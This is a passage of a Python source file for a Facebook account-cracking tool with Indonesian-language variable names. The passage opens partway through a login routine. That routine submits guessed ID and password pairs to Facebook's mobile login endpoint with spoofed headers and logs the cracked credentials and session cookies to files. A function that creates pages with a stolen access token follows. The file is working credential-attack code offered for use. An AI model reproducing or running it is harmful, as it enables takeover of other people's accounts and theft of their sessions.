            "li": re.search('name="li" value="(.*?)"', str(p.text)).group(1),
            "try_number": re.search('name="try_number" value="(.*?)"', str(p.text)).group(1),
            "unrecognized_tries": re.search('name="unrecognized_tries" value="(.*?)"', str(p.text)).group(1),
            "prefill_contact_point": "",
            "prefill_source": "",
            "prefill_type": "",
            "first_prefill_source": "",
            "first_prefill_type": "",
            "had_cp_prefilled": False,
            "had_password_prefilled": False,
            "is_smart_lock": True,
            "bi_xrwh":re.search('name="bi_xrwh" value="(.*?)"', str(p.text)).group(1),
            "__dyn": "",
            "__csr": "",
            "__a": "",
            "__user": "0",
            "_fb_noscript": "true"}
            Santai_Kalem_Ae_Masuk_san_sini_Gasken_jangan_lupa_tobat_bro_gasken={"Host": "m.facebook.com",
            "content-length": str(rr(2000,2199)),
            "cache-control": "max-age=0",
            "x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
            "sec-ch-ua-platform-version": f'"{str(rr(5,12))}.0.0"',
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://p.facebook.com",
            "viewport-width": "360",
            "sec-ch-ua": f'"Not:A-Brand";v="99", "Chromium";v="112"',
            "x-asbd-id": "129477",
            "x-requested-with": "XMLHttpRequest",
            "referer": "https://p.facebook.com/login.php?skip_api_login=1&api_key=3213804762189845&kid_directed_site=0&app_id=3213804762189845&signed_next=1&next=https%3A%2F%2Fp.facebook.com%2Fv19.0%2Fdialog%2Foauth%3Fapp_id%3D3213804762189845%26cbt%3D1713932735608%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df468c892445c2baf9%2526domain%253Dwww.capcut.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.capcut.com%25252Ff55d76d7b702b1bb1%2526relation%253Dopener%26client_id%3D3213804762189845%26display%3Dpopup%26domain%3Dwww.capcut.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fid-id%252Flogin%26locale%3Den_US%26logger_id%3Dfdfa4369659211140%26origin%3D1%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfcd7790f9c8244212%2526domain%253Dwww.capcut.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.capcut.com%25252Ff55d76d7b702b1bb1%2526relation%253Dopener%2526frame%253Df1c4162b6fdf4739c%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv19.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dfcd7790f9c8244212%26domain%3Dwww.capcut.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.capcut.com%252Ff55d76d7b702b1bb1%26relation%3Dopener%26frame%3Df1c4162b6fdf4739c%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=popup&locale=en_GB&pl_dbl=0",
            "sec-ch-ua-mobile": "?1",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "sec-ch-ua-platfrom": '"Android"',
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "navigate",
            "sec-fetch-dest": "document",
            "user-agent": ua,
            "sec-fetch-user": "?1",
            "sec-websocket-version": str(rr(5,13)),
            "accept-encoding": "gzip, deflate, br",
            "accept-language": AinkRaka}
            po = ses.post('https://p.facebook.com/login/device-based/regular/login/',data=Rajia_Maut_Menunggu_Kehadiran_Sang_Pembuat_Dosa_Mengalir,headers=Santai_Kalem_Ae_Masuk_san_sini_Gasken_jangan_lupa_tobat_bro_gasken,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                Meledak = Tree(Panel.fit(f"Login checkpoint",style="bold yellow"))
                Meledak.add(Panel.fit(f"{idf} | {pw}",style="bold yellow"))
                Meledak.add(Panel.fit(f"{ua}",style="bold yellow"))
                prints(Meledak)
                open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
                akun.append(idf+'|'+pw)
                cp+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok+=1
                kukis=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
                Meledak = Tree(Panel.fit(f"Login Successfully",style="bold green"))
                Meledak.add(Panel.fit(f"{idf} | {pw}",style="bold green"))
                Meledak.add(Panel.fit(f"{kukis}",style="bold green"))
                prints(Meledak)
                open('OK/'+okc,'a').write(idf+'|'+pw+'|'+'\n')
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(3)
    loop-=1



# ---------- [ CREATE PAGE ] --------------- #


def CreatePage(name:str, category:list, token:str):
    r    = requests.Session()
    vir  = {"params":{"client_input_params":{"cp_upsell_declined":0,"category_ids":category,"profile_plus_id":"0","page_id":"0"},"server_params":{"name":name,"INTERNAL__latency_qpl_instance_id":random.randrange(36700000,36800000),"creation_source":"android","screen":"category","referrer":"pages_tab_launch_point","INTERNAL__latency_qpl_marker_id":float(str('{:.13f}'.format(random.random()+3))+'E13'),"variant":5}}}
    var  = {"params":{"params":json.dumps(vir),"bloks_versioning_id":'c3cc18230235472b54176a5922f9b91d291342c3a276e2644dbdb9760b96deec',"app_id":"com.bloks.www.additional.profile.plus.creation.action.category.submit"},"scale":"1","nt_context":{"styles_id":'e6c6f61b7a86cdf3fa2eaaffa982fbd1',"using_white_navbar":True,"pixel_ratio":1,"is_push_on":True,"bloks_version":'c3cc18230235472b54176a5922f9b91d291342c3a276e2644dbdb9760b96deec'}}
    data = {'access_token':token,'method':'post','pretty':False,'format':'json','server_timestamps':True,'locale':'id_ID','purpose':'fetch','fb_api_req_friendly_name':'FbBloksActionRootQuery-com.bloks.www.additional.profile.plus.creation.action.category.submit','fb_api_caller_class':'graphservice','client_doc_id':'11994080423068421059028841356','variables':json.dumps(var),'fb_api_analytics_tags':["GraphServices"],'client_trace_id':str(uuid.uuid4())}
    pos  = r.post('https://graph.facebook.com/graphql', data=data).text.replace('\\','')
    if ('profile_plus_id' in str(pos)) and ('page_id' in str(pos)):
        name, page_id, profile_id = re.findall(r'"android", "pages_tab_launch_point", "(.*?)", "(.*?)", "(.*?)", "intent_selection"', str(pos))[0]
        print('Success Create Page!')
        print('Page Name  :', name)
        print('Page ID    :', page_id)
        print('Profile ID :', profile_id)
    else:
        print('Failed Create Page!')



if __name__ == "__main__":
    try:os.mkdir('OK')
    except:pass
    try:os.mkdir('CP')
    except:pass
    login()

""" AUTHOR : MELEDAK X CIK
    VERSI : 0.5
    NOTE : RIKODE ANAK DODOL JAN GANTI NAMA AUTHO SU """
